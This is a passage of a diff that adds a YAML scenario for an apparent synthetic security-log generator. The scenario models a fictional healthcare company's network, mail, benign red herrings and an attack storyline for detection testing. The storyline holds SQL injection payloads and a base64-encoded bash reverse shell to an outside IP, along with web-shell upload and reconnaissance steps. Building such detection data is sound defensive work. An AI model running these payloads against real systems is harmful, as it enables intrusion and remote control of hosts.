@@ -1,0 +1,1824 @@
+version: "1.0"
+name: iteration-test-1_0
+description: |
+  Canonical EvidenceForge iteration-test scenario for fast generate/evaluate/fix cycles. It
+  preserves the expanded environment and attack narrative while including authored,
+  transport-correlated IDS assertions, sensor-local filtering, and deliberate no-alert cases
+  for broad automated and LLM-as-a-judge quality evaluation.
+  Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
+  integration services from a corporate HQ with an on-premises data center. The
+  storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
+  movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
+  exfiltration, email abuse, and cleanup into a 6-hour collection window while
+  preserving broad event-type and log-format coverage. This expanded variant adds
+  explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
+  MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
+  egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
+  and deterministic background email traffic. This benchmark epoch also adds one
+  representative benign cleartext multipart support upload through the explicit proxy.
+
+environment:
+  description: "Meridian Healthcare Solutions corporate HQ and on-prem data center"
+  domain: "meridianhcs.local"
+
+  timezone:
+    default: "America/Chicago"
+
+  users:
+    - username: lina.nguyen
+      full_name: "Lina Nguyen"
+      email: "lina.nguyen@meridianhcs.com"
+      persona: developer
+      primary_system: WS-LNGUYEN-01
+      groups: ["engineering"]
+      browsing_intensity: heavy
+
+    - username: omar.haddad
+      full_name: "Omar Haddad"
+      email: "omar.haddad@meridianhcs.com"
+      persona: data_analyst
+      primary_system: WS-OHADDAD-01
+      groups: ["analytics"]
+
+    - username: marcus.chen
+      full_name: "Marcus Chen"
+      email: "marcus.chen@meridianhcs.com"
+      persona: sysadmin
+      primary_system: WS-MCHEN-01
+      groups: ["it-admins", "domain-admins"]
+
+    - username: priya.patel
+      full_name: "Priya Patel"
+      email: "priya.patel@meridianhcs.com"
+      persona: security_analyst
+      primary_system: WS-PPATEL-01
+      groups: ["security"]
+
+    - username: evelyn.brooks
+      full_name: "Evelyn Brooks"
+      email: "evelyn.brooks@meridianhcs.com"
+      persona: executive
+      primary_system: WS-EBROOKS-01
+      groups: ["executives"]
+
+    - username: diego.ramirez
+      full_name: "Diego Ramirez"
+      email: "diego.ramirez@meridianhcs.com"
+      persona: accountant
+      primary_system: WS-DRAMIREZ-01
+      groups: ["finance"]
+
+    - username: aisha.johnson
+      full_name: "Aisha Johnson"
+      email: "aisha.johnson@meridianhcs.com"
+      persona: help_desk
+      primary_system: WS-AJOHNSON-01
+      groups: ["it-support"]
+
+    - username: sophia.martinez
+      full_name: "Sophia Martinez"
+      email: "sophia.martinez@meridianhcs.com"
+      persona: sales
+      primary_system: WS-SMARTINEZ-01
+      groups: ["sales"]
+      browsing_intensity: light
+
+  service_accounts:
+    - svc_backup
+    - svc_monitor
+    - svc_mhsync
+    - apache
+    - root
+
+  stale_accounts:
+    - username: jennifer.walsh
+      last_active: "2023-11-15"
+      reason: "Transferred to London office"
+
+  groups:
+    - name: engineering
+      members: ["lina.nguyen"]
+    - name: analytics
+      members: ["omar.haddad"]
+    - name: it-admins
+      members: ["marcus.chen", "aisha.johnson"]
+    - name: domain-admins
+      members: ["marcus.chen"]
+    - name: security
+      members: ["priya.patel"]
+    - name: executives
+      members: ["evelyn.brooks"]
+    - name: finance
+      members: ["diego.ramirez"]
+    - name: sales
+      members: ["sophia.martinez"]
+
+  network_identities:
+    - id: ehr_portal
+      hosts: ["ehr-portal.meridianhcs.com"]
+      ips: ["203.14.220.10", "10.10.3.10"]
+      tags: ["web", "dmz", "healthcare"]
+      dns: true
+    - id: corporate_proxy
+      hosts: ["proxy.meridianhcs.com"]
+      ips: ["10.10.3.20"]
+      tags: ["proxy", "infrastructure"]
+      dns: true
+    - id: mail_edge_public
+      hosts: ["mail.meridianhcs.com"]
+      ips: ["203.14.220.11"]
+      tags: ["email", "smtp"]
+      dns: true
+    - id: westbridge_services
+      hosts:
+        - "api.westbridge-services.net"
+        - "edge.westbridge-services.net"
+        - "metrics.westbridge-services.net"
+        - "ns1.westbridge-services.net"
+        - "ns1.westbridge-services.cloud"
+      ips: ["45.33.32.30"]
+      tags: ["web", "dns", "external"]
+      dns: true
+    - id: ubuntu_archive
+      hosts: ["archive.ubuntu.com"]
+      ips: ["91.189.91.82"]
+      tags: ["software", "package_repository", "external"]
+      dns: true
+    - id: valeworks_support
+      hosts: ["support.valeworks-health.net"]
+      ips: ["52.44.186.73"]
+      tags: ["web", "vendor", "support", "external"]
+      dns: true
+
+  systems:
+    - hostname: WS-LNGUYEN-01
+      ip: "10.10.1.21"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: lina.nguyen
+      services: ["ssh", "systemd-resolved"]
+
+    - hostname: WS-OHADDAD-01
+      ip: "10.10.1.22"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: omar.haddad
+      services: ["ssh", "systemd-resolved"]
+
+    - hostname: WS-MCHEN-01
+      ip: "10.10.1.31"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: marcus.chen
+      services: ["dns-client", "w32time"]
+
+    - hostname: WS-PPATEL-01
+      ip: "10.10.1.32"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: priya.patel
+      services: ["dns-client", "w32time"]
+
+    - hostname: WS-EBROOKS-01
+      ip: "10.10.1.33"
+      os: "Windows 10 Enterprise"
+      type: workstation
+      assigned_user: evelyn.brooks
+      services: ["dns-client", "w32time"]
+
+    - hostname: WS-DRAMIREZ-01
+      ip: "10.10.1.34"
+      os: "Windows 10 Enterprise"
+      type: workstation
+      assigned_user: diego.ramirez
+      services: ["dns-client", "w32time"]
+
+    - hostname: WS-AJOHNSON-01
+      ip: "10.10.1.35"
+      os: "Windows 10 Enterprise"
+      type: workstation
+      assigned_user: aisha.johnson
+      services: ["dns-client", "w32time", "remote_desktop"]
+
+    - hostname: WS-SMARTINEZ-01
+      ip: "10.10.1.36"
+      os: "Windows 10 Enterprise"
+      type: workstation
+      assigned_user: sophia.martinez
+      services: ["dns-client", "w32time"]
+
+    - hostname: LT-MRIVERA-02
+      ip: "10.10.1.99"
+      os: "Ubuntu 22.04"
+      type: workstation
+      services: ["dhclient", "ssh"]
+
+    - hostname: DC-01
+      ip: "10.10.2.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["ad-ds", "dns", "kerberos", "ldap", "smb", "w32time", "windows-dhcp-server"]
+      roles: ["domain_controller", "dns_server", "dhcp_server"]
+
+    - hostname: FILE-SRV-01
+      ip: "10.10.2.20"
+      os: "Windows Server 2019"
+      type: server
+      services: ["smb", "dns-client", "w32time"]
+      roles: ["file_server"]
+
+    - hostname: MAIL-EDGE-01
+      ip: "10.10.2.25"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["smtp", "imaps", "postfix", "dovecot", "systemd-resolved"]
+      roles: ["mail_server"]
+
+    - hostname: MAIL-CLIN-01
+      ip: "10.10.2.26"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["smtp", "imaps", "postfix", "dovecot", "systemd-resolved"]
+      roles: ["mail_server"]
+
+    - hostname: MAIL-FIN-01
+      ip: "10.10.2.27"
+      os: "Windows Server 2022"
+      type: server
+      services: ["smtp", "owa", "imaps", "exchange", "dns-client", "w32time"]
+      roles: ["mail_server"]
+
+    - hostname: WEB-EXT-01
+      ip: "10.10.3.10"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["apache2", "php-fpm", "ssh", "systemd-resolved"]
+      roles: ["web_server"]
+      public_hostnames: ["ehr-portal.meridianhcs.com"]
+
+    - hostname: PROXY-01
+      ip: "10.10.3.20"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["squid", "ssh", "systemd-resolved"]
+      roles: ["forward_proxy"]
+      public_hostnames: ["proxy.meridianhcs.com"]
+
+    - hostname: APP-INT-01
+      ip: "10.10.2.30"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["ssh", "gunicorn", "systemd-resolved"]
+      roles: ["app_server"]
+
+    - hostname: DB-PROD-01
+      ip: "10.10.4.10"
+      os: "CentOS 8"
+      type: server
+      services: ["mysql", "ssh"]
+      roles: ["database"]
+
+  storage:
+    population: medium
+    activity: normal
+    servers:
+      - system: FILE-SRV-01
+        presets: [collaboration, homes]
+        audit: high
+        default_volume: data
+        volumes:
+          - id: data
+            mount: 'D:\'
+            filesystem: ntfs
+            label: SharedData
+          - id: archive
+            mount: 'C:\Mounts\Archive\'
+            filesystem: refs
+            label: ClinicalArchive
+        shares:
+          - id: finance
+            name: Finance
+            volume: data
+            root: 'Departments\Finance'
+            preset: department
+            population: medium
+            activity: high
+            encryption: not_required
+            access:
+              read: [finance]
+              modify: [finance]
+              admin: [domain-admins]
+              deny: [sales]
+            seed_files:
+              - ref: q1_forecast
+                path: 'Q1\FY24\Q1-forecast.xlsx'
+                size_bytes: 1843200
+                tags: [finance, office, forecast]
+              - ref: q1_budget
+                path: 'Q1\FY24\Q1-budget.xlsx'
+                size_bytes: 937984
+                tags: [finance, office, budget]
+              - ref: q1_variance
+                path: 'Q1\FY24\Q1-variance.xlsx'
+                size_bytes: 716800
+                tags: [finance, office, variance]
+              - ref: q1_board_pack
+                path: 'Q1\FY24\Q1-board-pack.pdf'
+                size_bytes: 4928307
+                tags: [finance, pdf, board]
+              - ref: q1_close_notes
+                path: 'Q1\FY24\Q1-close-notes.docx'
+                size_bytes: 284672
+                tags: [finance, office, close]
+              - ref: variance_draft
+                path: 'Q1\FY24\Drafts\variance-notes.docx'
+                size_bytes: 198144
+                tags: [finance, office, draft]
+          - id: clinical-exports
+            name: ClinicalExports
+            volume: archive
+            root: 'Clinical\Exports'
+            preset: backup
+            population: small
+            activity: low
+            encryption: required
+            access:
+              read: [analytics]
+              modify: [analytics]
+              admin: [domain-admins]
+              deny: []
+            seed_files:
+              - ref: deidentified_claims
+                path: 'Audit\2024-03\deidentified-claims-sample.csv'
+                size_bytes: 8650752
+                tags: [clinical, export, csv, deidentified]
+    mappings:
+      - id: finance-f
+        share: FILE-SRV-01.finance
+        audience:
+          groups: [finance]
+          systems: [WS-DRAMIREZ-01]
+        drive: 'F:'
+        lifecycle: persistent
+
+  network:
+    public_cidrs: ["203.14.220.0/28"]
+    segments:
+      - name: corporate_lan
+        cidr: "10.10.1.0/24"
+        description: "Corporate workstation network"
+        systems:
+          - WS-LNGUYEN-01
+          - WS-OHADDAD-01
+          - WS-MCHEN-01
+          - WS-PPATEL-01
+          - WS-EBROOKS-01
+          - WS-DRAMIREZ-01
+          - WS-AJOHNSON-01
+          - WS-SMARTINEZ-01
+          - LT-MRIVERA-02
+        exposure: internal
+      - name: server_vlan
+        cidr: "10.10.2.0/24"
+        description: "Internal server VLAN"
+        systems: [DC-01, FILE-SRV-01, MAIL-EDGE-01, MAIL-CLIN-01, MAIL-FIN-01, APP-INT-01]
+        exposure: internal
+      - name: dmz
+        cidr: "10.10.3.0/24"
+        description: "Internet-facing DMZ"
+        systems: [WEB-EXT-01, PROXY-01]
+        exposure: both
+        external_ratio: 0.6
+      - name: database_vlan
+        cidr: "10.10.4.0/24"
+        description: "Database VLAN without a dedicated sensor"
+        systems: [DB-PROD-01]
+        exposure: internal
+    sensors:
+      - type: network
+        name: zeek-core
+        placement: span
+        monitoring_segments: [corporate_lan, server_vlan]
+        direction: bidirectional
+        log_formats: [zeek]
+      - type: network
+        name: zeek-dmz
+        placement: span
+        monitoring_segments: [dmz]
+        direction: bidirectional
+        log_formats: [zeek]
+      - type: ids
+        name: snort-perimeter
+        placement: tap
+        monitoring_segments: [dmz]
+        direction: bidirectional
+        log_formats: [snort_alert]
+      - type: ids
+        name: snort-core
+        placement: span
+        monitoring_segments: [corporate_lan, server_vlan]
+        direction: bidirectional
+        log_formats: [snort_alert]
+      - type: firewall
+        name: fw-perimeter
+        placement: tap
+        monitoring_segments: [corporate_lan, server_vlan, dmz]
+        direction: bidirectional
+        log_formats: [cisco_asa]
+        interfaces:
+          corporate_lan: inside
+          server_vlan: inside
+          dmz: dmz
+        default_action: deny
+        deny_ratio: 2.0
+        drop_mode: drop
+        threat_detection_rate: 10
+        nat_rules:
+          - type: dynamic_pat
+            src: [corporate_lan, server_vlan, dmz]
+            mapped_ip: "203.14.220.1"
+          - type: static
+            src: dmz
+            real_ip: "10.10.3.10"
+            mapped_ip: "203.14.220.10"
+          - type: static
+            src: server_vlan
+            real_ip: "10.10.2.25"
+            mapped_ip: "203.14.220.11"
+        policy:
+          - {src: external, dst: dmz, ports: [80, 443]}
+          - {src: external, dst: server_vlan, ports: [25]}
+          - {src: corporate_lan, dst: any, ports: []}
+          - {src: server_vlan, dst: external, ports: [25, 53, 80, 443]}
+          - {src: server_vlan, dst: server_vlan, ports: []}
+          - {src: dmz, dst: server_vlan, ports: [3306]}
+
+  proxy:
+    mode: explicit
+    listener_port: 8080
+
+  email:
+    accepted_domains:
+      - meridianhcs.com
+      - research.meridianhcs.com
+    mail_servers:
+      - name: edge
+        hostname: mail.meridianhcs.com
+        system: MAIL-EDGE-01
+        platform: generic_smtp
+        allow_inbound_starttls: true
+        attempt_outbound_starttls: true
+      - name: clinical
+        hostname: mail-clinical.meridianhcs.com
+        system: MAIL-CLIN-01
+        platform: generic_smtp
+        allow_inbound_starttls: true
+        attempt_outbound_starttls: true
+      - name: finance
+        hostname: mail-fin.meridianhcs.com
+        system: MAIL-FIN-01
+        platform: exchange
+        allow_inbound_starttls: false
+        attempt_outbound_starttls: false
+    default_mailbox_servers: [edge]
+    mailbox_overrides:
+      - group: engineering
+        server: clinical
+      - group: analytics
+        server: clinical
+      - group: finance
+        server: finance
+      - group: executives
+        server: finance
+    outbound_routes:
+      - name: default
+        servers: [edge]
+      - name: clinical-via-edge
+        sender_groups: [engineering, analytics]
+        servers: [clinical, edge]
+        isp_relays:
+          - smtp1.greatplains-mail.net
+          - smtp2.greatplains-mail.net
+      - name: finance-via-edge
+        sender_groups: [finance, executives]
+        servers: [finance, edge]
+    inbound_route: [edge]
+    isp_relays:
+      - relay1.northlake-messaging.net
+      - relay2.northlake-messaging.net
+    distribution_groups:
+      - address: clinical-ops@meridianhcs.com
+        members:
+          - lina.nguyen@meridianhcs.com
+          - omar.haddad@meridianhcs.com
+          - priya.patel@meridianhcs.com
+      - address: finance@meridianhcs.com
+        members:
+          - diego.ramirez@meridianhcs.com
+          - evelyn.brooks@meridianhcs.com
+      - address: it-help@meridianhcs.com
+        members:
+          - aisha.johnson@meridianhcs.com
+          - marcus.chen@meridianhcs.com
+      - address: ehr-release@research.meridianhcs.com
+        members:
+          - lina.nguyen@meridianhcs.com
+          - omar.haddad@meridianhcs.com
+    artifacts:
+      mode: all
+    background_messages_per_user_per_day: 12.0
+    corpus: email_corpus.yaml
+
+time_window:
+  start: "2024-03-18T12:00:00Z"
+  duration: "6h"
+  warmup: "2h"
+
+logon_grace_period: "30m"
+observation_profile: enterprise_standard
+
+baseline_activity:
+  description: "Low-volume but varied healthcare IT baseline activity"
+  intensity: low
+  variation: medium
+  suspicious_noise: medium
+
+red_herrings:
+  - id: rh-001
+    time: "+1h05m"
+    actor: sophia.martinez
+    system: WS-SMARTINEZ-01
+    activity: "Sales user mistypes password several times before a normal logon"
+    explanation: "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement."
+    events:
+      - type: failed_logon
+        logon_type: 2
+        source_ip: "10.10.1.36"
+        target_username: sophia.martinez
+        technique: "Benign - User Error"
+        description: "First mistyped password"
+      - type: failed_logon
+        logon_type: 2
+        source_ip: "10.10.1.36"
+        target_username: sophia.martinez
+        technique: "Benign - User Error"
+        description: "Second mistyped password"
+      - type: failed_logon
+        logon_type: 2
+        source_ip: "10.10.1.36"
+        target_username: sophia.martinez
+        technique: "Benign - User Error"
+        description: "Third mistyped password"
+      - type: logon
+        logon_type: 2
+        source_ip: "10.10.1.36"
+        technique: "Benign - User Error"
+        description: "Successful local logon after typos"
+
+  - id: rh-003
+    time: "+2h05m"
+    actor: lina.nguyen
+    system: WS-LNGUYEN-01
+    activity: "Developer refreshes Ubuntu package metadata from the public archive"
+    explanation: "Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert."
+    events:
+      - type: connection
+        dst_ip: "91.189.91.82"
+        dst_port: 80
+        hostname: "archive.ubuntu.com"
+        service: http
+        method: GET
+        uri: "/ubuntu/dists/jammy/InRelease"
+        status_code: 200
+        user_agent: "Debian APT-HTTP/1.3 (2.4.10)"
+        orig_bytes: 734
+        resp_bytes: 270118
+        ids_alerts:
+          - sid: 2013504
+            policy: every
+        technique: "Benign - Package Maintenance"
+        description: "Expected APT metadata retrieval that produces a policy false positive"
+
+  - id: rh-004
+    time: "+3h32m"
+    actor: lina.nguyen
+    system: WS-LNGUYEN-01
+    activity: "Developer uploads EHR connector diagnostics to a vendor support case"
+    explanation: "Lina attached a routine diagnostics bundle to an existing vendor support case while troubleshooting an integration issue."
+    event_spacing:
+      mode: automated
+      min_delay: "2s"
+      max_delay: "5s"
+    events:
+      - type: process
+        process_name: "/usr/bin/tar"
+        command_line: >-
+          /usr/bin/tar -czf /tmp/mhs-support-48217.tar.gz
+          /var/log/ehr-connector/connector.log /var/log/ehr-connector/queue.log
+        technique: "Benign - Vendor Support"
+        description: "Create a compressed diagnostics bundle for the support case"
+      - type: process
+        process_name: "/usr/bin/curl"
+        command_line: >-
+          /usr/bin/curl --fail --silent --show-error
+          --proxy http://proxy.meridianhcs.com:8080
+          --form 'metadata={"ticket":"MHS-48217","component":"ehr-connector"};type=application/json'
+          --form 'diagnostics=@/tmp/mhs-support-48217.tar.gz;type=application/gzip'
+          http://support.valeworks-health.net/api/v1/cases/MHS-48217/attachments
+        technique: "Benign - Vendor Support"
+        description: "Upload ticket metadata and the diagnostics archive to vendor support"
+      - type: connection
+        dst_ip: "52.44.186.73"
+        dst_port: 80
+        hostname: "support.valeworks-health.net"
+        service: http
+        method: POST
+        uri: "/api/v1/cases/MHS-48217/attachments"
+        status_code: 200
+        user_agent: "curl/7.81.0"
+        request_multipart:
+          media_type: multipart/form-data
+          parts:
+            - name: metadata
+              value: '{"ticket":"MHS-48217","component":"ehr-connector"}'
+              content_type: application/json
+              detected_mime_type: application/json
+            - name: diagnostics
+              body_len: 1572864
+              local_source_path: /tmp/mhs-support-48217.tar.gz
+              filename: mhs-support-48217.tar.gz
+              content_type: application/gzip
+              detected_mime_type: application/gzip
+        response_body_len: 96
+        technique: "Benign - Vendor Support"
+        description: "Vendor support accepts the multipart diagnostics upload"
+
+  - id: rh-005
+    time: "+4h05m"
+    actor: diego.ramirez
+    system: WS-DRAMIREZ-01
+    activity: "Finance user completes a routine month-end document work burst on the mapped share"
+    explanation: "Diego reviews, edits, creates, and publishes ordinary Finance documents through his persistent F: mapping."
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "20s", "1m", "2m", "3m"]
+    events:
+      - type: smb_activity
+        operation: browse
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Browse the quarter-end working set through F:"
+      - type: smb_activity
+        operation: read
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_budget
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Open the current quarter budget workbook"
+      - type: smb_activity
+        operation: update
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_variance
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Save updated variance calculations"
+      - type: smb_activity
+        operation: create
+        purpose: interactive
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          path: 'Q1\FY24\Working\close-checklist.txt'
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Create a close checklist on the Finance share"
+      - type: smb_activity
+        operation: move
+        purpose: interactive
+        source:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: variance_draft
+        destination:
+          type: share
+          share: FILE-SRV-01.finance
+          path: 'Q1\FY24\Published\variance-notes.docx'
+        outcome: success
+        path_style: mapped
+        mapping: finance-f
+        technique: "Benign - Finance Operations"
+        description: "Publish a draft by moving it within the same share"
+
+  - id: rh-006
+    time: "+4h40m"
+    actor: marcus.chen
+    system: WS-MCHEN-01
+    activity: "Sysadmin retrieves a deidentified audit sample from the encrypted clinical export share"
+    explanation: "Marcus copies an approved deidentified sample for a scheduled access-control review; SMB encryption limits network-layer file visibility."
+    events:
+      - type: smb_activity
+        operation: copy
+        purpose: administrative
+        source:
+          type: share
+          share: FILE-SRV-01.clinical-exports
+          file_ref: deidentified_claims
+        destination:
+          type: client
+          path: 'C:\Users\marcus.chen\Downloads\deidentified-claims-sample.csv'
+        outcome: success
+        path_style: unc
+        technique: "Benign - IT Maintenance"
+        description: "Copy an approved audit sample over an encrypted SMB share"
+
+  - id: rh-002
+    time: "+5h10m"
+    actor: marcus.chen
+    system: DC-01
+    activity: "Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01"
+    explanation: "Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics."
+    events:
+      - type: rdp_session
+        source_ip: "10.10.1.31"
+        technique: "Benign - IT Maintenance"
+        description: "Legitimate sysadmin RDP session"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Get-EventLog -LogName System -Newest 50\""
+        technique: "Benign - IT Maintenance"
+        description: "Review recent system events"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Test-Connection FILE-SRV-01 -Count 4\""
+        technique: "Benign - IT Maintenance"
+        description: "Network diagnostic test"
+
+storyline:
+  - id: evt-email-001
+    time: "+12m"
+    actor: diego.ramirez
+    system: WS-DRAMIREZ-01
+    activity: "External benefits-themed phishing message is delivered to Finance with hidden security Bcc"
+    events:
+      - type: email_message
+        sender: notices@benefits-serviceportal.com
+        to: [finance@meridianhcs.com]
+        cc: [evelyn.brooks@meridianhcs.com]
+        bcc: [priya.patel@meridianhcs.com]
+        corpus_id: benefits-confirmation
+        artifact_id: benefits-confirmation-msg
+        verdict: phishing
+        mail_action: deliver
+        outcome: delivered
+        technique: "T1566.002 - Phishing: Spearphishing Link"
+        description: "External benefits message routed inbound through the edge mail server"
+
+  - id: evt-email-002
+    time: "+18m"
+    actor: diego.ramirez
+    system: WS-DRAMIREZ-01
+    activity: "Finance user reads the suspicious benefits message through OWA"
+    events:
+      - type: email_read
+        mailbox: diego.ramirez@meridianhcs.com
+        server: finance
+        protocol: owa
+        message_ids: [benefits-confirmation-msg]
+        count: 4
+        duration: 74.0
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
+        technique: "T1566.002 - Phishing: Spearphishing Link"
+        description: "Opaque TLS mailbox access for the delivered phishing message"
+
+  - id: evt-email-003
+    time: "+24m"
+    actor: diego.ramirez
+    system: WS-DRAMIREZ-01
+    activity: "Diego forwards the suspicious message to the help desk and discreetly copies security"
+    events:
+      - type: email_message
+        to: [it-help@meridianhcs.com]
+        bcc: [priya.patel@meridianhcs.com]
+        corpus_id: finance-forward-to-it
+        artifact_id: finance-forward-to-it-msg
+        verdict: suspicious
+        mail_action: deliver
+        outcome: delivered
+        technique: "T1566.002 - Phishing: Spearphishing Link"
+        description: "Internal cross-server mail route from finance mailbox to IT recipients"
+
+  - id: evt-001
+    time: "+30m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "External attacker scans the DMZ for exposed services"
+    event_spacing:
+      mode: automated
+      min_delay: "100ms"
+      max_delay: "300ms"
+    events:
+      - type: port_scan
+        source_ip: "185.70.41.45"
+        target_segment: dmz
+        ports: [22]
+        scan_rate: 50
+        ids_alerts:
+          - sid: 2002911
+            policy:
+              event_filter:
+                type: limit
+                track: by_src
+                count: 1
+                seconds: 60
+        technique: "T1046 - Network Service Discovery"
+        description: "External SSH scan of public DMZ targets"
+      - type: port_scan
+        source_ip: "185.70.41.45"
+        target_segment: dmz
+        ports: [80, 443, 8080, 8443, 3306]
+        scan_rate: 50
+        technique: "T1046 - Network Service Discovery"
+        description: "External web and database service scan of public DMZ targets"
+
+  - id: evt-002
+    time: "+31m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "External attacker runs Nikto web vulnerability scanning against the EHR portal"
+    events:
+      - type: web_scan
+        source_ip: "185.70.41.45"
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        hostname: "ehr-portal.meridianhcs.com"
+        preset: nikto
+        rate: 10
+        duration: "20m"
+        technique: "T1595.002 - Active Scanning: Vulnerability Scanning"
+        description: "Nikto scan of the EHR portal"
+
+  - id: evt-003
+    time: "+45m"
+    actor: root
+    system: LT-MRIVERA-02
+    activity: "Rogue laptop obtains an address from DHCP on the corporate LAN"
+    events:
+      - type: dhcp_lease
+        mac_address: "DC:A6:32:44:91:7B"
+        requested_ip: "10.10.1.99"
+        technique: "T1200 - Hardware Additions"
+        description: "Raspberry Pi-class rogue device obtains DHCP lease"
+
+  - id: evt-email-004
+    time: "+48m"
+    actor: lina.nguyen
+    system: WS-LNGUYEN-01
+    activity: "Engineering sends an internal EHR release note to a clinical operations distribution group"
+    events:
+      - type: email_message
+        to: [ehr-release@research.meridianhcs.com]
+        cc: [clinical-ops@meridianhcs.com]
+        corpus_id: ehr-release-note
+        artifact_id: ehr-release-note-msg
+        verdict: clean
+        mail_action: deliver
+        outcome: delivered
+        technique: "Benign - Internal Collaboration"
+        description: "Corpus-backed same-server clinical mail with distribution group expansion"
+
+  - id: evt-email-005
+    time: "+53m"
+    actor: omar.haddad
+    system: WS-OHADDAD-01
+    activity: "Analytics user reads the EHR release note through IMAPS"
+    events:
+      - type: email_read
+        mailbox: omar.haddad@meridianhcs.com
+        server: clinical
+        protocol: imaps
+        message_ids: [ehr-release-note-msg]
+        count: 5
+        duration: 96.0
+        user_agent: "Thunderbird 115.7.0"
+        technique: "Benign - Internal Collaboration"
+        description: "Opaque IMAPS mailbox read against the clinical mail server"
+
+  - id: evt-004
+    time: "+1h"
+    actor: apache
+    system: WEB-EXT-01
+    activity: "SQL injection probes against the EHR portal produce server errors"
+    events:
+      - type: connection
+        source_ip: "185.70.41.45"
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        hostname: "ehr-portal.meridianhcs.com"
+        service: http
+        method: "POST"
+        uri: "/ehr/patient/search?q=%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+        status_code: 500
+        user_agent: "sqlmap/1.7.12#stable (https://sqlmap.org)"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "SQL injection probe against patient search"
+      - type: connection
+        source_ip: "185.70.41.45"
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        hostname: "ehr-portal.meridianhcs.com"
+        service: http
+        method: "POST"
+        uri: "/ehr/login?user=admin%27%20OR%20%271%27=%271"
+        status_code: 500
+        user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "SQL injection attempt against login form"
+
+  - id: evt-005
+    time: "+1h20m"
+    actor: apache
+    system: WEB-EXT-01
+    activity: "Web shell upload and reverse shell callback to direct-IP C2"
+    events:
+      - type: connection
+        source_ip: "185.70.41.45"
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        hostname: "ehr-portal.meridianhcs.com"
+        service: http
+        method: "POST"
+        uri: "/ehr/admin/upload.php"
+        status_code: 200
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
+        orig_bytes: 18432
+        resp_bytes: 912
+        technique: "T1505.003 - Server Software Component: Web Shell"
+        description: "Web shell upload through vulnerable admin endpoint"
+      - type: process
+        process_name: "/bin/bash"
+        command_line: "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'"
+        technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
+        description: "Base64-encoded reverse shell launcher"
+      - type: connection
+        dst_ip: "45.33.32.30"
+        dst_port: 8443
+        service: ssl
+        orig_bytes: 620
+        resp_bytes: 1840
+        technique: "T1105 - Ingress Tool Transfer"
+        description: "Reverse shell callback to direct-IP C2"
+      - type: raw
+        target_format: syslog
+        fields:
+          hostname: WEB-EXT-01
+          app_name: "apache2"
+          pid: 2418
+          facility: 3
+          severity: 4
+          message: "[Mon Mar 18 07:20:42.128744 2024] [proxy_fcgi:error] [pid 2418] [client 185.70.41.45:53218] AH01071: Got error 'PHP message: SQLSTATE[42000]: syntax error or access violation near UNION SELECT username,password FROM users'"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "Raw Apache-style error message from exploit attempt"
+
+  - id: evt-006
+    time: "+1h40m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Network and host discovery from the compromised web server"
+    events:
+      - type: process
+        process_name: "/usr/sbin/ip"
+        command_line: "ip addr show"
+        technique: "T1016 - System Network Configuration Discovery"
+        description: "List network interfaces"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/hosts"
+        technique: "T1016 - System Network Configuration Discovery"
+        description: "Read local hosts file"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/resolv.conf"
